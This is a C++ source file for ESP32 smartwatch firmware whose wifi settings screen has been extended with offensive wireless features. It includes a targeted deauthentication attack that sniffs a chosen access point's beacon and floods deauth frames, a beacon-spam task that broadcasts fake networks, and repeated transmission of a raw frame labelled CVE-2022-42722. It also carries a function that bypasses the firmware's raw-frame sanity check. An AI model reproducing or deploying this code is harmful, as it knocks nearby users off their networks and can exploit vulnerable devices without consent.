/****************************************************************************
 *   Tu May 22 21:23:51 2020
 *   Copyright  2020  Dirk Brosswick
 *   Email: dirk.brosswick@googlemail.com
 ****************************************************************************/
 
/*
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 */
#include "config.h"
#include "wlan_settings.h"
#include "gui/mainbar/mainbar.h"
#include "gui/mainbar/setup_tile/setup_tile.h"
#include "gui/statusbar.h"
#include "gui/keyboard.h"
#include "gui/setup.h"
#include "gui/widget_factory.h"
#include "gui/widget_styles.h"
#include "hardware/wifictl.h"
#include "hardware/motor.h"
#include "hardware/display.h"
#include "hardware/ble/gadgetbridge.h"
#include "utils/bluejsonrequest.h"
#include "utils/webserver/webserver.h"
#include "utils/ftpserver/ftpserver.h"

#ifdef NATIVE_64BIT
    #include "utils/logging.h"
#else
    #include <Arduino.h>
    #include <WiFi.h>
    #include <esp_wifi.h>
#endif

lv_obj_t *wifi_settings_tile=NULL;
lv_style_t wifi_list_style;
uint32_t wifi_settings_tile_num;
icon_t *wifi_setup_icon = NULL;

lv_obj_t *wifi_password_tile=NULL;
lv_style_t wifi_password_style;
lv_obj_t *wifi_password_name_label=NULL;
lv_obj_t *wifi_password_pass_textfield=NULL;
uint32_t wifi_password_tile_num;

lv_obj_t *wifi_setup_tile=NULL;
lv_style_t wifi_setup_style;
uint32_t wifi_setup_tile_num;

lv_obj_t *wifi_onoff=NULL;
lv_obj_t *deauth_onoff=NULL;
lv_obj_t *wifiname_list=NULL;

static void enter_wifi_settings_event_cb( lv_obj_t * obj, lv_event_t event );
static void enter_wifi_setup_event_cb( lv_obj_t * obj, lv_event_t event );
static void wifi_onoff_event_handler(lv_obj_t * obj, lv_event_t event);
static void deauth_onoff_event_handler(lv_obj_t * obj, lv_event_t event);
static void apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type);
void wifi_settings_enter_pass_event_cb( lv_obj_t * obj, lv_event_t event );
bool wifi_setup_wifictl_event_cb( EventBits_t event, void *arg );

bool wifi_setup_bluetooth_message_event_cb( EventBits_t event, void *arg );
static void wifi_setup_bluetooth_message_msg_pharse( BluetoothJsonRequest &doc );

LV_IMG_DECLARE(lock_16px);
LV_IMG_DECLARE(unlock_16px);
LV_IMG_DECLARE(wifi_64px);

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    //printf("Sanity check bypass called!: %d, %d, %d\n", arg, arg2, arg3);
    if (arg == 31337)
      return 1;
    else
      return 0;
}

const wifi_promiscuous_filter_t filt = {.filter_mask=WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA};

String ssid;
uint8_t encryptionType;
int32_t RSSI;
uint8_t *BSSID;
int32_t channel;

int32_t apchan;

static wifi_country_t country ={.cc="BO", .schan= 1, .nchan= 13, .max_tx_power= 127, .policy= WIFI_COUNTRY_POLICY_MANUAL };

static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

static const frame_raw_CVE_2022_42722[] = {
	0x80, 0xb4, 0xca, 0x92,
	0x01, 0x00, 0x00, 0x00, 0x00, 0x01,
	0x20, 0x00, 0x00, 0x00, 0xb1, 0xff,
	0xff, 0xff, 0xff, 0x00, 0xff, 0x00, 
	0x00, 0x00, 0xc1, 0xb3, 0xca, 0x92, 
	0x00, 0x00, 0x4c, 0x4c, 0x4c, 0x4c, 
	0x4c, 0x4c, 0x4c, 0x10, 0xaa, 0xff,
	0xd9, 0x00, 0x05, 0x00, 0xee, 0xa8, 
	0x1f, 0xd6, 0x7e, 0xc2, 0x4f, 0x10, 0xc1, 0x9c
};

String alfa = "1234567890qwertyuiopasdfghjkklzxcvbnm QWERTYUIOPASDFGHJKLZXCVBNM_";

 uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, //Frame Control, Duration
                    /*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //Destination address 
                    /*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //Source address - overwritten later
                    /*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //BSSID - overwritten to the same as the source address
                    /*22*/  0xc0, 0x6c, //Seq-ctl
                    /*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, //timestamp - the number of microseconds the AP has been active
                    /*32*/  0x64, 0x00, //Beacon interval
                    /*34*/  0x01, 0x04, //Capability info
                    /* SSID */
                    /*36*/  0x00
                    };

uint8_t deauth_frame[sizeof(deauth_frame_default)];

bool first_run = true;

void wlan_settings_tile_setup( void ) {
    // get an app tile and copy mainstyle
    wifi_settings_tile_num = mainbar_add_setup_tile( 2, 2, "wifi setup" );
    wifi_password_tile_num = wifi_settings_tile_num + 1;
    wifi_setup_tile_num = wifi_settings_tile_num + 2;

    wifi_settings_tile = mainbar_get_tile_obj( wifi_settings_tile_num );

    wifi_setup_icon = setup_register( "wifi", &wifi_64px, enter_wifi_settings_event_cb );
    setup_hide_indicator( wifi_setup_icon );

    lv_obj_t *header = wf_add_settings_header( wifi_settings_tile, "wlan" );
    lv_obj_align( header, wifi_settings_tile, LV_ALIGN_IN_TOP_LEFT, THEME_ICON_PADDING, STATUSBAR_HEIGHT + THEME_ICON_PADDING );

    lv_obj_t *setup_btn = wf_add_setup_button( wifi_settings_tile, enter_wifi_setup_event_cb, SETUP_STYLE );
    lv_obj_align( setup_btn, wifi_settings_tile, LV_ALIGN_IN_TOP_RIGHT, -THEME_ICON_PADDING, STATUSBAR_HEIGHT + THEME_ICON_PADDING );

    /*Copy the first switch and turn it ON*/    
    wifi_onoff = wf_add_switch( wifi_settings_tile, false );
    lv_obj_align( wifi_onoff, setup_btn, LV_ALIGN_OUT_LEFT_MID, -THEME_ICON_PADDING, 0 );
    lv_obj_set_event_cb( wifi_onoff, wifi_onoff_event_handler);

    deauth_onoff = wf_add_switch( wifi_settings_tile, false );
    lv_obj_align( deauth_onoff, wifi_onoff, LV_ALIGN_OUT_LEFT_MID, -THEME_ICON_PADDING, 0 );
    lv_obj_set_event_cb( deauth_onoff, deauth_onoff_event_handler);

    wifiname_list = lv_list_create( wifi_settings_tile, NULL);
    lv_obj_set_size( wifiname_list, lv_disp_get_hor_res( NULL ), lv_disp_get_ver_res( NULL ) - STATUSBAR_HEIGHT - THEME_ICON_SIZE );
    lv_style_init( &wifi_list_style  );
    lv_style_set_border_width( &wifi_list_style , LV_OBJ_PART_MAIN, 0);
    lv_style_set_radius( &wifi_list_style , LV_OBJ_PART_MAIN, 0);
    lv_obj_add_style( wifiname_list, LV_OBJ_PART_MAIN, &wifi_list_style  );
    lv_obj_align( wifiname_list, wifi_settings_tile, LV_ALIGN_IN_BOTTOM_MID, 0, 0 );

    wlan_password_tile_setup( wifi_password_tile_num );
    wlan_setup_tile_setup( wifi_setup_tile_num );

    wifictl_register_cb( WIFICTL_ON | WIFICTL_OFF | WIFICTL_SCAN_DONE | WIFICTL_SCAN_ENTRY, wifi_setup_wifictl_event_cb, "wifi network scan" );
}

uint32_t wifi_get_setup_tile_num( void ) {
    return ( wifi_setup_tile_num );
}

bool wifi_setup_wifictl_event_cb( EventBits_t event, void *arg ) {
    switch( event ) {
        case    WIFICTL_ON:
                    lv_switch_on( wifi_onoff, LV_ANIM_OFF );
                    break;
        case    WIFICTL_OFF:
                    lv_switch_off( wifi_onoff, LV_ANIM_OFF );
                    while ( lv_list_remove( wifiname_list, 0 ) );
                    break;
        case    WIFICTL_SCAN_DONE:
                    while ( lv_list_remove( wifiname_list, 0 ) );
                    break;
        case    WIFICTL_SCAN_ENTRY:
                    lv_obj_t * wifiname_list_btn = lv_list_add_btn( wifiname_list, wifictl_is_known( (const char*)arg )?&unlock_16px:&lock_16px , (const char*)arg );
                    lv_obj_set_event_cb( wifiname_list_btn, wifi_settings_enter_pass_event_cb);
                    break;
    }
    return( true );
}

static void enter_wifi_settings_event_cb( lv_obj_t * obj, lv_event_t event ) {
    switch( event ) {
        case( LV_EVENT_CLICKED ):       mainbar_jump_to_tilenumber( wifi_settings_tile_num, LV_ANIM_OFF );
                                        break;
    }
}

static void wifi_onoff_event_handler(lv_obj_t * obj, lv_event_t event) {
    switch( event ) {
        case( LV_EVENT_VALUE_CHANGED ): if( lv_switch_get_state( obj ) ) {
                                            wifictl_on();
                                        }
                                        else {
                                            esp_wifi_set_promiscuous(false);
                                            first_run = true;
                                            wifictl_off();
                                        }
    }
}

static void deauth_onoff_event_handler(lv_obj_t * obj, lv_event_t event) {
    switch( event ) {
        case( LV_EVENT_VALUE_CHANGED ): if( lv_switch_get_state( obj ) ) {
                                        display_set_timeout( DISPLAY_MAX_TIMEOUT );
                                        esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
                                        esp_wifi_set_country(&country);
                                        esp_wifi_set_max_tx_power(78);
                                        }
                                        else {
                                        esp_wifi_set_promiscuous(false);
                                        first_run = true;
                                        display_set_timeout( DISPLAY_MIN_TIMEOUT );
                                        esp_wifi_set_ps(WIFI_PS_MAX_MODEM);
                                        }
    }
}

void wifi_settings_enter_pass_event_cb( lv_obj_t * obj, lv_event_t event ) {
    switch( event ) {
        case( LV_EVENT_CLICKED ):   if( lv_switch_get_state( deauth_onoff ) ){
                            
                                    int b = (lv_list_get_btn_index(NULL, obj));

                                    WiFi.getNetworkInfo(b, ssid, encryptionType, RSSI, BSSID, channel);
                                    log_i("Target SSID: %s, BSSID: %d", ssid, BSSID);

                                    esp_wifi_set_promiscuous(true);
                                    esp_wifi_set_promiscuous_filter(&filt);
                                    esp_wifi_set_promiscuous_rx_cb(&apSnifferCallback);

                                    //Since channel return for a scan is broken in WiFi, we need to iterate through the channels ourselves. 
                                    //Blocking delay is fine as the wifi hardware still grabs packets, it just processes them after 
                                    //iteration is complete. Once we get the target AP beacon packet, which we should, given APs tend to send 
                                    //beacons every 100ms, we can simply pull the correct channel from that and set it.
                                    
                                    
                                    for (int y=1; y<14; y++){
                                    esp_wifi_set_channel(y, WIFI_SECOND_CHAN_NONE);
                                    log_i("Scan Chan %d", y);
                                    delay(150);
                                    }
                                    esp_wifi_set_channel(apchan, WIFI_SECOND_CHAN_NONE);
                                    log_i("AP Found on Channel %d. Setting Channel to %d.", apchan, apchan); 
                                   
                                    }
                                    else {
                                    lv_label_set_text( wifi_password_name_label, lv_list_get_btn_text(obj) );
                                    lv_textarea_set_text( wifi_password_pass_textfield, "");
                                    mainbar_jump_to_tilenumber( wifi_password_tile_num, LV_ANIM_ON );
                                    }
    }
}

void apSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type){

  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  int len = snifferPacket->rx_ctrl.sig_len;

  if (type == WIFI_PKT_MGMT){
    len -= 4;
    if ((first_run) && (snifferPacket->payload[0] == 0x80) && (snifferPacket->payload[16] == BSSID[0])  && (snifferPacket->payload[17] == BSSID[1]) && (snifferPacket->payload[18] == BSSID[2]) && (snifferPacket->payload[19] == BSSID[3]) && (snifferPacket->payload[20] = BSSID[4]) && (snifferPacket->payload[21] = BSSID[5])){
         log_i("AP beacon bssid matches target, gathering info");   

            apchan = snifferPacket->rx_ctrl.channel;

            memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

            memcpy (&deauth_frame[10], &snifferPacket->payload[10], sizeof(deauth_frame[10]));
            memcpy (&deauth_frame[11], &snifferPacket->payload[11], sizeof(deauth_frame[11]));
            memcpy (&deauth_frame[12], &snifferPacket->payload[12], sizeof(deauth_frame[12]));
            memcpy (&deauth_frame[13], &snifferPacket->payload[13], sizeof(deauth_frame[13]));
            memcpy (&deauth_frame[14], &snifferPacket->payload[14], sizeof(deauth_frame[14]));
            memcpy (&deauth_frame[15], &snifferPacket->payload[15], sizeof(deauth_frame[15]));

            memcpy(&deauth_frame[16], &BSSID[0], sizeof(deauth_frame[16]));
            memcpy(&deauth_frame[17], &BSSID[1], sizeof(deauth_frame[17]));
            memcpy(&deauth_frame[18], &BSSID[2], sizeof(deauth_frame[18]));
            memcpy(&deauth_frame[19], &BSSID[3], sizeof(deauth_frame[19]));
            memcpy(&deauth_frame[20], &BSSID[4], sizeof(deauth_frame[20]));
            memcpy(&deauth_frame[21], &BSSID[5], sizeof(deauth_frame[21])); 

            first_run = false;
            motor_vibe(10);
        }      
                  
    }   

    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame_default), false);
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame_default), false);
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame_default), false); 
    log_i("Sending packets");
    esp_wifi_80211_tx(WIFI_IF_STA, frame_raw_CVE_2022_42722, sizeof(frame_raw_CVE_2022_42722), false);
    esp_wifi_80211_tx(WIFI_IF_STA, frame_raw_CVE_2022_42722, sizeof(frame_raw_CVE_2022_42722), false);
    log_i("Sending CVE packets");
  
}

static void exit_wifi_password_event_cb( lv_obj_t * obj, lv_event_t event );
static void wlan_password_event_cb(lv_obj_t * obj, lv_event_t event);
static void apply_wifi_password_event_cb(  lv_obj_t * obj, lv_event_t event );
static void delete_wifi_password_event_cb(  lv_obj_t * obj, lv_event_t event );

void wlan_password_tile_setup( uint32_t wifi_password_tile_num ) {
    // get an app tile and copy mainstyle
    wifi_password_tile = mainbar_get_tile_obj( wifi_password_tile_num );

    lv_obj_t *header = wf_add_settings_header( wifi_password_tile, "wlan setting", exit_wifi_password_event_cb );
    lv_obj_align( header, wifi_password_tile, LV_ALIGN_IN_TOP_LEFT, 10, STATUSBAR_HEIGHT + THEME_ICON_PADDING );
    
    wifi_password_name_label = wf_get_settings_header_title(header);

    wifi_password_pass_textfield = lv_textarea_create( wifi_password_tile, NULL);
    lv_textarea_set_text( wifi_password_pass_textfield, "");
    lv_textarea_set_pwd_mode( wifi_password_pass_textfield, false);
    lv_textarea_set_one_line( wifi_password_pass_textfield, true);
    lv_textarea_set_cursor_hidden( wifi_password_pass_textfield, true);
    lv_obj_set_width( wifi_password_pass_textfield, lv_disp_get_hor_res( NULL ) - THEME_ICON_PADDING * 2 );
    lv_obj_align( wifi_password_pass_textfield, header, LV_ALIGN_OUT_BOTTOM_MID, THEME_ICON_PADDING, THEME_ICON_PADDING );
    lv_obj_set_event_cb( wifi_password_pass_textfield, wlan_password_event_cb );

    lv_obj_t *mac_label = lv_label_create( wifi_password_tile, NULL);
    lv_obj_add_style( mac_label, LV_IMGBTN_PART_MAIN, &wifi_password_style );
    lv_obj_set_width( mac_label, lv_disp_get_hor_res( NULL ) );
    lv_obj_align( mac_label, wifi_password_tile, LV_ALIGN_IN_BOTTOM_LEFT, 0, 0);
#ifdef NATIVE_64BIT
    lv_label_set_text_fmt( mac_label, "MAC:" );
#else
    lv_label_set_text_fmt( mac_label, "MAC: %s", WiFi.macAddress().c_str());
#endif

    lv_obj_t *apply_btn = wf_add_check_button( wifi_password_tile, apply_wifi_password_event_cb, &wifi_password_style );
    lv_obj_align( apply_btn, wifi_password_pass_textfield, LV_ALIGN_OUT_BOTTOM_RIGHT, -10, 10 );

    lv_obj_t *delete_btn = wf_add_trash_button( wifi_password_tile, delete_wifi_password_event_cb, &wifi_password_style );
    lv_obj_align( delete_btn, wifi_password_pass_textfield, LV_ALIGN_OUT_BOTTOM_LEFT, 10, 10 );
}

static void apply_wifi_password_event_cb(  lv_obj_t * obj, lv_event_t event ) {
    switch( event ) {
        case( LV_EVENT_CLICKED ):       wifictl_insert_network( lv_label_get_text( wifi_password_name_label ), lv_textarea_get_text( wifi_password_pass_textfield ) );
                                        keyboard_hide();
                                        mainbar_jump_to_tilenumber( wifi_settings_tile_num, LV_ANIM_ON );
                                        break;
    }
}

static void delete_wifi_password_event_cb(  lv_obj_t * obj, lv_event_t event ) {
    switch( event ) {
        case( LV_EVENT_CLICKED ):       wifictl_delete_network( lv_label_get_text( wifi_password_name_label ) );
                                        keyboard_hide();
                                        mainbar_jump_to_tilenumber( wifi_settings_tile_num, LV_ANIM_ON );
                                        break;
    }
}

static void wlan_password_event_cb( lv_obj_t * obj, lv_event_t event ) {
    switch( event ) {
        case( LV_EVENT_CLICKED ):       keyboard_set_textarea( obj );
                                        break;
    }
}

static void exit_wifi_password_event_cb( lv_obj_t * obj, lv_event_t event ) {
    switch( event ) {
        case( LV_EVENT_CLICKED ):       keyboard_hide();
                                        mainbar_jump_back();
                                        break;
    }
}

lv_obj_t *wifi_autoon_onoff = NULL;
lv_obj_t *wifi_ftpserver_onoff = NULL;
lv_obj_t *wifi_enabled_on_standby_onoff = NULL;
lv_obj_t *beacon_spam_onoff = NULL;

static void wps_start_event_handler( lv_obj_t * obj, lv_event_t event );
static void wifi_autoon_onoff_event_handler( lv_obj_t * obj, lv_event_t event );
static void beacon_spam_onoff_event_handler( lv_obj_t * obj, lv_event_t event );
static void wifi_ftpserver_onoff_event_handler( lv_obj_t * obj, lv_event_t event );
static void wifi_enabled_on_standby_onoff_event_handler( lv_obj_t * obj, lv_event_t event );
bool wifi_setup_autoon_event_cb( EventBits_t event, void *arg );

void wlan_setup_tile_setup( uint32_t wifi_setup_tile_num ) {
    // get an app tile and copy mainstyle
    wifi_setup_tile = mainbar_get_tile_obj( wifi_setup_tile_num );

    lv_obj_t *header = wf_add_settings_header( wifi_setup_tile, "wlan settings" );
    lv_obj_align( header, wifi_setup_tile, LV_ALIGN_IN_TOP_LEFT, 10, STATUSBAR_HEIGHT + THEME_ICON_PADDING );

    lv_obj_t *beacon_spam_onoff_cont = wf_add_labeled_switch( wifi_setup_tile, "Beacon Spam", &beacon_spam_onoff, NULL, beacon_spam_onoff_event_handler, SETUP_STYLE );
    lv_obj_align( beacon_spam_onoff_cont, header, LV_ALIGN_OUT_BOTTOM_MID, 0, THEME_ICON_PADDING );

    lv_obj_t *wifi_autoon_onoff_cont = wf_add_labeled_switch( wifi_setup_tile, "enable on wakeup", &wifi_autoon_onoff, wifictl_get_autoon(), wifi_autoon_onoff_event_handler,SETUP_STYLE );
    lv_obj_align( wifi_autoon_onoff_cont, beacon_spam_onoff_cont, LV_ALIGN_OUT_BOTTOM_MID, 0, THEME_ICON_PADDING );

    lv_obj_t *wifi_enabled_on_standby_onoff_cont = wf_add_labeled_switch( wifi_setup_tile, "enable on standby", &wifi_enabled_on_standby_onoff, wifictl_get_enable_on_standby(), wifi_enabled_on_standby_onoff_event_handler, SETUP_STYLE );
    lv_obj_align( wifi_enabled_on_standby_onoff_cont, wifi_autoon_onoff_cont, LV_ALIGN_OUT_BOTTOM_MID, 0, THEME_ICON_PADDING );

    lv_obj_t *wifi_ftpserver_onoff_cont = wf_add_labeled_switch( wifi_setup_tile, "enable ftpserver", &wifi_ftpserver_onoff, wifictl_get_ftpserver(), wifi_ftpserver_onoff_event_handler, SETUP_STYLE );
    lv_obj_align( wifi_ftpserver_onoff_cont, wifi_enabled_on_standby_onoff_cont, LV_ALIGN_OUT_BOTTOM_MID, 0, THEME_ICON_PADDING );

    lv_obj_t *wps_btn = lv_btn_create( wifi_setup_tile, NULL);
    lv_obj_set_event_cb( wps_btn, wps_start_event_handler );
    lv_obj_add_style( wps_btn, LV_BTN_PART_MAIN, ws_get_button_style() );
    lv_obj_t *wps_btn_label = lv_label_create( wps_btn, NULL );
    lv_label_set_text( wps_btn_label, "start WPS");
    lv_obj_align( wps_btn, wifi_ftpserver_onoff_cont, LV_ALIGN_OUT_BOTTOM_MID, 0, 0 );

    #ifndef ENABLE_FTPSERVER
        lv_obj_set_hidden( wifi_ftpserver_onoff_cont, true );
    #endif

    gadgetbridge_register_cb( GADGETBRIDGE_JSON_MSG, wifi_setup_bluetooth_message_event_cb, "wifi settings" );
    wifictl_register_cb( WIFICTL_AUTOON, wifi_setup_autoon_event_cb, "wifi setup");
}

static void wps_start_event_handler( lv_obj_t * obj, lv_event_t event ) {
    switch( event ) {
        case( LV_EVENT_CLICKED ):       wifictl_start_wps();
                                        break;
    }
}

static void enter_wifi_setup_event_cb( lv_obj_t * obj, lv_event_t event ) {
    switch( event ) {
        case( LV_EVENT_CLICKED ):       mainbar_jump_to_tilenumber( wifi_setup_tile_num, LV_ANIM_ON );
                                        break;
    }
}

static void wifi_autoon_onoff_event_handler( lv_obj_t * obj, lv_event_t event ) {
    switch (event) {
        case (LV_EVENT_VALUE_CHANGED):  wifictl_set_autoon( lv_switch_get_state( obj ) );
                                        break;
    }
}

void spam_task(void *pvParameter) {         motor_vibe(10);
                                            for(;;){
                                            int set_channel = random(1,13);
                                            esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
                                            delay(1);

                                            packet[10] = packet[16] = random(256);
                                            packet[11] = packet[17] = random(256);
                                            packet[12] = packet[18] = random(256);
                                            packet[13] = packet[19] = random(256);
                                            packet[14] = packet[20] = random(256);
                                            packet[15] = packet[21] = random(256);

                                            packet[37] = 6;
                                            
                                            memcpy (&packet[38], &alfa[random(65)], sizeof(packet[38]));
                                            memcpy (&packet[39], &alfa[random(65)], sizeof(packet[39]));
                                            memcpy (&packet[40], &alfa[random(65)], sizeof(packet[40]));
                                            memcpy (&packet[41], &alfa[random(65)], sizeof(packet[41]));
                                            memcpy (&packet[42], &alfa[random(65)], sizeof(packet[42]));
                                            memcpy (&packet[43], &alfa[random(65)], sizeof(packet[43]));

                                            uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                                                                    0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };

                                            // Add everything that goes after the SSID
                                             for(int i = 0; i < 12; i++) {
                                             memcpy (&packet[44 + i], &postSSID[i], sizeof(packet[44 + i]));
                                             }
                                             
                                             packet[56] =set_channel;

                                             esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
                                             esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
                                             esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
                                             esp_wifi_80211_tx(WIFI_IF_STA, frame_raw_CVE_2022_42722, sizeof(frame_raw_CVE_2022_42722), false);
                                             esp_wifi_80211_tx(WIFI_IF_STA, frame_raw_CVE_2022_42722, sizeof(frame_raw_CVE_2022_42722), false);
                                             
                                             if ( lv_switch_get_state( beacon_spam_onoff ) ) {
                                             }
                                             else {
                                                 vTaskDelete (NULL);
                                             }
                                            }

}

static void beacon_spam_onoff_event_handler( lv_obj_t * obj, lv_event_t event ) {
    switch (event) {
        case (LV_EVENT_VALUE_CHANGED):  if ( lv_switch_get_state( beacon_spam_onoff ) ) {
                                             display_set_timeout( DISPLAY_MAX_TIMEOUT );
                        
                                             esp_wifi_set_max_tx_power(78);
                     
                                            xTaskCreate(&spam_task, "spam_task", 4096, NULL, 5, NULL);
                                        
                                        }
                                        else {
                                             display_set_timeout( DISPLAY_MIN_TIMEOUT ); 
                                        }
                                        break;
    }
}

static void wifi_ftpserver_onoff_event_handler( lv_obj_t * obj, lv_event_t event ) {
    switch (event) {
        case (LV_EVENT_VALUE_CHANGED):  wifictl_set_ftpserver( lv_switch_get_state( obj ) );
                                        break;
    }
}

static void wifi_enabled_on_standby_onoff_event_handler( lv_obj_t * obj, lv_event_t event ) {
    switch (event) {
        case (LV_EVENT_VALUE_CHANGED):  wifictl_set_enable_on_standby( lv_switch_get_state( obj ) );
                                        if ( lv_switch_get_state( obj ) ) {
                                            setup_set_indicator( wifi_setup_icon, ICON_INDICATOR_FAIL );
                                        }
                                        else {
                                            setup_hide_indicator( wifi_setup_icon );
                                        }
                                        break;
    }
}

bool wifi_setup_autoon_event_cb( EventBits_t event, void *arg ) {
    switch( event ) {
        case WIFICTL_AUTOON:
            if ( *(bool*)arg ) {
                lv_switch_on( wifi_autoon_onoff, LV_ANIM_OFF);
            }
            else {
                lv_switch_off( wifi_autoon_onoff, LV_ANIM_OFF);
            }
            break;
    }
    return( true );
}

bool wifi_setup_bluetooth_message_event_cb( EventBits_t event, void *arg ) {
    switch( event ) {
        case GADGETBRIDGE_JSON_MSG: wifi_setup_bluetooth_message_msg_pharse( *(BluetoothJsonRequest*)arg );
                                    break;
    }
    return( true );
}

void wifi_setup_bluetooth_message_msg_pharse( BluetoothJsonRequest &doc ) {
    if( !doc.containsKey("t") )
        return;

    if( !doc.containsKey("app") )
        return;

    if( !strcmp( doc["t"], "conf" ) ) {
        /**
         * check for app settings and if settings aviable
         */
        if ( !strcmp( doc["app"], "settings" ) && doc.containsKey("settings") ) {
            /**
             * check if we have settings for wlan
             */
            if ( !strcmp( doc["settings"], "wlan" ) && doc.containsKey("ssid") && doc.containsKey("key") ) {
                motor_vibe(100);
                wifictl_insert_network(  doc["ssid"] |"" , doc["key"] |"" );
            }
        }
    }
}
